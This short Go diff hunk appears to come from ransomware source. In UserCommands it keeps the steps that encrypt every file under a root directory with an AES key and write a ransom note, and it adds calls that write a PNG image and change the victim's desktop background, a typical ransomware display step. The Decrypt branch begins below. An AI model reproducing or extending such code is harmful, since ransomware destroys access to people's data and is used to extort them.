@@ -51,6 +51,8 @@ func UserCommands() {
 
 		filedirectory.EncryptTheFiles(rootDirectory, aesKey)
 		notes.WriteANote()
+		notes.WriteToPng()
+		notes.ChangeBackgroundImage()
 		return
 	case Decrypt:
 		log.Println("[+] Decrypting process")
